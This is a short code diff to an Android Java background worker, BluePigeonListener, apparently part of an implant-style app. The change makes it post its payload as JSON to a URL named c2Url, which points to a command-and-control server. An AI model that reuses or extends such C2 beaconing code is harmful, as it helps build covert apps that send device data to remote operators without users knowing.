@@ -172,8 +172,7 @@ public class BluePigeonListener extends Worker {
 
         String response = null;
         try {
-            // url encode payload
-            payload = "p=" + URLEncoder.encode(payload, "utf-8");
+            // put payload in post data
             byte[] postData = payload.getBytes( StandardCharsets.UTF_8 );
             int postDataLength = postData.length;
 
@@ -181,7 +180,7 @@ public class BluePigeonListener extends Worker {
             String c2Url = MainActivity.BLUE_COOP_URL;
             URL url = new URL(c2Url);
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
-            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            httpURLConnection.setRequestProperty("Content-Type", "application/json");
             httpURLConnection.setRequestProperty("Accept-Language", "en-SG");
             httpURLConnection.setRequestProperty("charset", "utf-8");
             httpURLConnection.setRequestProperty("Content-Length", Integer.toString(postDataLength ));
